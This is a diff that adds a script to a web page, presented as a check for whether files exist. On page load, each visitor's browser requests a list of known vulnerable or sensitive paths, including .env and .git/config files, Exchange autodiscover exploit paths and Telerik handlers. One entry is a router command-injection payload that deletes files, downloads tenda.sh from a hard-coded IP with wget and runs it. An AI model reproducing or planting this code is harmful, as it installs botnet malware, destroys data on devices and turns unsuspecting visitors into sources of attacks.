@@ -1,0 +1,54 @@
+<script>
+// List of files to check
+const filesToCheck = [
+    '../cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh)',
+    '../autodiscover/autodiscover.json?@zdi/Powershell',
+    '../owa/auth/x.js',
+    '../backup/.git/config',
+    '../log/.git/config',
+    '../doc/.git/config',
+    '../autodiscover/autodiscover.json?@1337.com/owa/?&Email=autodiscover/autodiscover.json%3F@1337.com',
+    '../Telerik.Web.UI.WebResource.axd?type=rau',
+    '../WebInterface/',
+    '../sugar_version.json',
+    '../icons/sphere1.png',
+    '../static/historypage.js',
+    '../cgi-bin/authLogin.cgi',
+    '../remote/login',
+    '../sitecore/shell/sitecore.version.xml',
+    '../js/NewWindow_2_all.js',
+    '../cf_scripts/scripts/ajax/ckeditor/ckeditor.js',
+    '../showLogin.cc',
+    '../webfig/',
+    '../cgi-bin/config.exp',
+    '../solr/',
+    '../api/session/properties',
+    '../.env',
+    '../owa/auth/logon.aspx'
+];
+
+// Function to check if file exists
+async function checkFileExists(file) {
+    try {
+        const response = await fetch(file);
+        if (response.status === 200) {
+            console.log(`File ${file} exists.`);
+        } else {
+            console.log(`File ${file} does not exist.`);
+        }
+    } catch (error) {
+        console.error(`Error checking file ${file}: ${error}`);
+    }
+}
+
+// Function to check existence of multiple files
+async function checkFilesExistence(files) {
+    for (const file of files) {
+        await checkFileExists(file);
+    }
+}
+
+// Call the function to check existence of files
+checkFilesExistence(filesToCheck);
+
+</script>
